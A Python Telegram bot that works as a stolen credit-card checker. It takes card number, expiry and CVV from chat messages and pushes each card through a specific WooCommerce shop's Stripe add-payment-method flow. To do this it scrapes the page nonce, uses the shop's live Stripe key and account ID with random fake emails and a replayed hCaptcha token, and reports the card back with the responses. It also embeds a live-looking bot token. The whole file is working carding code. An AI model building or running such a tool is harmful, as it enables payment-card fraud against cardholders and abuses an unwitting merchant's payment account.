import telebot
import requests
import re
from faker import Faker
from urllib.parse import urlencode

TOKEN = '8072279299:AAHPYhOiKdnivLNkonK_RTISmhE40ucoVik'
bot = telebot.TeleBot(TOKEN)
fake = Faker()

BASE_URL = "https://kiltermonpurepasture.com"
ADD_PAYMENT_METHOD_URL = f"{BASE_URL}/my-account-2/add-payment-method/"
AJAX_URL = f"{BASE_URL}/wp-admin/admin-ajax.php"
STRIPE_URL = "https://api.stripe.com/v1/payment_methods"
STRIPE_PK = "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs"

def get_random_gmail():
    return fake.user_name() + str(fake.random_int(1000,9999)) + "@gmail.com"

def get_setup_intent_nonce(session):
    resp = session.get(ADD_PAYMENT_METHOD_URL, headers={
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
        "Referer": f"{BASE_URL}/my-account-2/payment-methods/",
    })
    match = re.search(r'name="_ajax_nonce"\s+value="([^"]+)"', resp.text)
    if not match:
        match = re.search(r'createSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']', resp.text)
    if not match:
        match = re.search(r'_ajax_nonce["\']?\s*:\s*["\']([^"\']+)["\']', resp.text)
    return match.group(1) if match else None

def get_stripe_pm_id(cc, mm, yy, cvv, email):
    # Full post data as in your sample, with only email replaced
    post_data = {
        "billing_details[name]": "+",
        "billing_details[email]": email,
        "billing_details[address][country]": "IQ",
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        "allow_redisplay": "unspecified",
        "payment_user_agent": "stripe.js/ca98f11090; stripe-js-v3/ca98f11090; payment-element; deferred-intent",
        "referrer": "https://kiltermonpurepasture.com",
        "time_on_page": "25324",
        "client_attribution_metadata[client_session_id]": "c00ce4af-869c-4fff-8c3f-59ff231ff32d",
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "guid": "fc3027f2-20ca-42d5-ac74-eb1805756ee733bb94",
        "muid": "11415e57-f4c7-43f5-9322-b7233710355ed20a49",
        "sid": "288a0fee-3757-40ee-ba25-c54ac85634f56686d4",
        "key": STRIPE_PK,
        "_stripe_account": "acct_1PNFjnCGos24OgXQ",
        "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiMWlyeWNtZnh2TGVudVFtM0RMK2FBTVhBYnJKeEhCSWlucWZva3lEMnNUWUV3M2JUMDNpa0pMWEREUEV5OStsU1N0aE9DMHg0QnczWnBjTFV4V0QrZWpCTHUvTjlJUWZPWEFGMmorSmo3cGEzQVFUZitzOG5CK2tTY1M4bFljWHNFRVR6c0ovMDFWamRlWWJ0OXFxV3hkWFVKWnNPWkUxS1piUGRVUkZ0aWRzWk9DbjZhaFFlYVpsaW4vR0t2UncwN2J6T2QySFp4UzZKK3JiQjNhMTJkS0tSd05aL2dUOWxzeEtMSGwxVG4wVXVKcmo4UnF3WjZhYktVRFJkRjB6dlNpTWJKZUtrM3ovais0SU90Qmp6SnpKalFZb0tWKzdqT29vclh3K0RFMm9PcGpnUzhGNTRxSUpoZDVVb1RXVnBqais3aXZnMitQS1Bjc3ZMLzllQldoQVdJanF2cXpyU1h5L0M4MTBsMkZTNWtRaXpvSytuVk9mNWhYM0ZUOHl2UWFwR0ptVzUrQ2dpTUtwemNibHBhMW9FQ0JZZTNjckFJOEIzTWtRWVNLS09EUnJ5VW5FVk9hTzY0OVIzaUI4VjY4RVBCRDFuRXBBRjVSTEVqbm5JY1VKMGt5emZ2czJMdjJMcURKTG1wY2ZVUGdMMTBjQTIxTzNZTzNkUTM3Y1RBMHJMVDdROEhHeU80SWtLUjIrcTZuYkFod2RQL1cyTjdXMkJJcXJRZzYrUTZaeEtLL3I3NCt1ODBpcVRJS2hoeHdSckVzL2h6aE9GM0JPeWs1VmN4azRvcUpjalRZNHpZK3BuYlBqTXR2RWZmZ1lETGJnOERRS1U2bDUydUJhMFdBNW1mdmpSZ2RzbjBJVXB5TXhndnJTWXk1QVVQVUdydVRVMndBMFREcFR6UDQ5VVU5S2x6MVhwVlJGemRUaTMvSnY0RGNaVEh2ZGJiRHRmYXBYZVNGZXpwV2pnSzNiY2N4QkswWjVjMDd1SldvL3FGcFRiMjdxay9HTjQvU3c3MTJMUHhickphYURhR0NGT092YzBZelUxV3hZWlV0WHVsTm1JYSt1TGxlNGpjTGZDcExCbEM1OFp2VmxOUXJRY0FOZzNzRmk3TUx4QmdaR0NwblhtUm1iRG9mMllJa01NMlRDbkx0WFJ3aEdVVUxNS05ubm5MVXNDeWZLdGNJQUNPTlkwVFBBa2E4OFk0UXRoSWhUSkRtSEE1NVNxZVEzOGZKdGx4MldXMCtnMkJzSFlVR2lHUXo5ejcyMW9VS3Y1RUNQVjdacXhVQ2IyRE1jM0V4b2daRHJSUEVKUlN3YWFpTTBCL3NZZi93dEFpcHRtaFo5WkNEQmFiYXpsbmtDeVU2QTVOOUY3VGowcG5BUGc5YkExNWVGK2J2ZVNzUlJ4RkE0T2VJVTlscTBweCs3RVZqUnBzczhXZHhOb0IrTXNSY3I2OFp5SW1xVkpkeDZXU3JzaGlPbGpJS2YrWVQ2WDZ5QVp5YUdJNkJrZGRqeFprdloxdlZiWVE5dWRzMVdDMjhUNzMzVmk1czVBTWh1OVp4WjdWR1VONHlWbnNlek5HQ0pkdktyd0k2M3NBZEdHS0owZS9MTVZBdWlXUTVlVUswUUFoRWh2OFBmakN6Tk8yZkxxVWVvcHNtVTBhZjA0MjhSMXlWckNHOWN3VFBOMDVTT293N2ZNaUc4T3BEWkVPTkVJMXRzTlRHaVFNWEFlbWVra0d2emprWHk2MU4wY1VuTjFhM3NOaVpMSHNaeHIyNHlVWnh2K0FVbGk4aHhtY0ZDM0ZwWWMzdzBjREs4VUpuSG9GbVEvaG9ESTBEeHdGTnB0NmN2Sm85VVkyYUZwRThqKzBrL2NPcU56Z2hzeHFoK0Q1MEVnRHZ4cnRXTGc5S3BLbmxDMzViVDd5TVgxcTVlSi83K3pleDhkL2JIWE1TRVhWYzBHVXJDMjN4WFQxT1RlSXhoSzJTYWdIYmZiVFp2TDNRclA3Skc2OGJqZ243OUV6elBGWHlnSW84QkRtd09JSUQzbmNMaFY3bDZsMjBhcDAzQnkyUERzL1N3QUZhWEV4ZkRBK3BaaUFzQXhyQU1WcjZIaFhueUc0MEk3YWlwdFk4cmtGMVNqb2VyVXVETzIwL1VOVlNiM01TNVFsWjFYb1RKMnBSS3ZxK2loazE5RVBRRkV3dmhpYytpVEFRL3IzVDczbmpqUzQvSUk2RjUvc2lwRXlNUkhrL2hwRVdzTTM0ZlFkVEZmWW0wdEFsQW1HenVGSmNMMWtiSDBaZ3lONDJ1NGozM0JWT2U1WURqK0kyRXZZQStiTWdxOGpnd3VLSjJJbzRsdzRBeWpubVBLdVVYaVpSM0NYRi84V0dzZDd2Vi9IMVI3dmtsSWdpVTcxM2E5OGlZbmNYdEZtNE1OUEVKRnlGb1dJQWJHL05Jcm1aK0I5YjR3QUxpSWV3VTFJTE1KdTVjV1BHSzhNV0laNXNwYTI4c01Kek5IUzZRY3N4MWdqQ09Rd0pxKzIxOFFHOU50a0Zqbkh3Nk53OXN1NGlLNDNFSlBsd2xWTXVISzUweDVYc09ZVDNKTkNxVXJBa0NPTXRaeVBEeGU2N0R6T3VrZlJLZjlybXpJS0E5TllvVUdPM3VValk1ZkF5Ull1MDJjUUZ1Wi9ucC9iS2VKb1BJRkd6MU12MUdPVXo3aDNuZEJDQ1U1aTAwTnRBdVgzeHFWYXg0NVR5ZW9EUDFxV3RsWUlDbHFDaVhhbW53QWdzcE1sMWVsMWZ6RlpEaURjSDJmdHZsUXltVWo2bkJ1QjJlNHZnb3NQR1dxNGtTNkRFcz0iLCJleHAiOjE3NDY0MTQzNTAsInNoYXJkX2lkIjo1MzU3NjU1OSwia3IiOiI0OWEzOThmIiwicGQiOjAsImNkYXRhIjoiRXBzSm01cVhOZllEc3d4ZlN1em5yNFR6NnN6dUhqL3E0MFRrNzZHdThqdXY3S2xOamdFRE52dENEUVl2RFIwRnR6MzNnUDl0QlA2cFZtSCtqME5HejFSREdPakI1VkZmYW9Xd3pUazhHbnI5TXY1NTQ2dDIzOUROOXNrWWRvSXhXZVZ5bjR5cEhSMFNHOTZ0Z3A4K29xd3ZQYWwvQ2dtNGZSdzc4WmIrNjNHQVVJZmswd3B4Vmc2TGFXV3dNZ3FQUjVFMGd2L2tadHlnWlpNTyJ9.DCBhLEwys5NWYHzHOknP8cj1KT1DJgjDMqOJJkZ3O0M"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
    }
    resp = requests.post(STRIPE_URL, data=urlencode(post_data), headers=headers)
    try:
        resp_json = resp.json()
        return resp_json.get("id"), resp_json
    except Exception as e:
        return None, {"error": str(e), "response": resp.text}

def check_card(card_data):
    parts = card_data.split('|')
    if len(parts) != 4:
        return "❌ Invalid format. Use: CC|MM|YY|123 or CC|MM|2024|123"
    cc, mm, yy, cvv = [x.strip() for x in parts]
    if len(yy) == 2:
        yy = f"20{yy}"
    elif len(yy) != 4:
        return "❌ Invalid year format (use 2 or 4 digits)."

    email = get_random_gmail()
    session = requests.Session()
    nonce = get_setup_intent_nonce(session)
    if not nonce:
        return "❌ Could not find _ajax_nonce (createSetupIntentNonce) value on the page."

    pm_id, stripe_resp = get_stripe_pm_id(cc, mm, yy, cvv, email)
    if not pm_id:
        return f"❌ Failed to get Stripe pm_ value. Response:\n{stripe_resp}"

    boundary = '----WebKitFormBoundaryLDAs04rYKJqlswfi'
    data = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="action"\r\n\r\n'
        f'create_setup_intent\r\n'
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="wcpay-payment-method"\r\n\r\n'
        f'{pm_id}\r\n'
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="_ajax_nonce"\r\n\r\n'
        f'{nonce}\r\n'
        f'--{boundary}--\r\n'
    )
    headers = {
        'Host': 'kiltermonpurepasture.com',
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'same-origin',
        'Accept-Language': 'en-US,en;q=0.9',
        'Sec-Fetch-Mode': 'cors',
        'Origin': 'https://kiltermonpurepasture.com',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1',
        'Referer': 'https://kiltermonpurepasture.com/my-account-2/add-payment-method/',
        'Cookie': "; ".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
    }

    try:
        response = session.post(AJAX_URL, headers=headers, data=data, timeout=15)
        result = (
            f"🟢 Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"📧 Email: {email}\n"
            f"🔍 Stripe pm_: {pm_id}\n"
            f"🔍 Stripe response: {stripe_resp}\n"
            f"🔍 WooCommerce response:\n{response.text}"
        )
        return result
    except Exception as e:
        return f"❌ Error: {str(e)}"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Send card in format: CC|MM|YY|123 or CC|MM|2024|123")

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    text = message.text.strip()
    if '|' in text:
        result = check_card(text)
        bot.reply_to(message, result)
    else:
        bot.reply_to(message, "❌ Invalid format. Use: CC|MM|YY|123 or CC|MM|2024|123")

if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()